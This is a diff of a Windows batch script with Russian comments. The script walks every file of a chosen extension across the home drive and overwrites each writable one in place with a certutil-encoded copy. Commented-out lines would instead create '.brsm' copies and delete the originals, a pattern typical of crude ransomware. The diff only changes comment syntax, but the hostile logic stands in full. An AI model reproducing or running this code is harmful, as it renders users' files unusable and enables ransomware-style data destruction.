@@ -18,16 +18,16 @@ for /r "%homedrive%\" %%i in (*%fileExtension%) do (
 			echo skip:       %%i 
 		) else (
 		icacls %filename% | findstr /R ("%username%".*F)
-		:: параметр /C не работает
+		rem параметр /C не работает
 		if %errorlevel% equ 0 (
 			certutil -f -encode "%%i" "%%i" >nul
-			::certutil -f -encode "%%i" "%%i.brsm" >nul
-			::echo "%%i.brsm"
-			::del /F /Q  "%%i" >nul	
+			rem certutil -f -encode "%%i" "%%i.brsm" >nul
+			rem echo "%%i.brsm"
+			rem del /F /Q  "%%i" >nul	
 			set /a cnt+=1
 			rem альтернатива - создание зашифрованной копии, требуется ("%username%".*M) вместо ("%username%".*F) на 20-й строке 
-			::copy /Y "%%i.brsm" "%%i"
-			::del /F /Q "%%i.brsm"
+			rem copy /Y "%%i.brsm" "%%i"
+			rem del /F /Q "%%i.brsm"
 			
 		) else (
 			echo no access to "%%i"
